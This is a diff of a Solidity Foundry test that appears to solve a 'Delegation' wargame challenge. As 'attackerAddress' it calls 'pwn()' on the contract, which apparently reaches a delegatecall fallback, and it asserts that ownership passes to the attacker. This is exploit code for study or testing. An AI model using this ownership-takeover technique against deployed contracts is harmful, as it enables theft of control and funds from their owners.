@@ -22,14 +22,14 @@ contract DelegationTest is Test {
         assert(delegation.owner() == owner);
     }
 
-    function test_changeOwnerDelegate() public {
+    function test_changeOwnerDelegation() public {
         console.log(delegation.owner());
          
         vm.prank(attackerAddress);
         (bool success, bytes memory data) = address(delegation).call(abi.encodeWithSignature("pwn()"));
-        if (success) {
-          console.log(string(data));
-        }
-        console.log(delegation.owner());
+        require(success, "Failed");
+        console.log(string(data));
+
+        assert(delegation.owner() == attackerAddress);
     }
 }
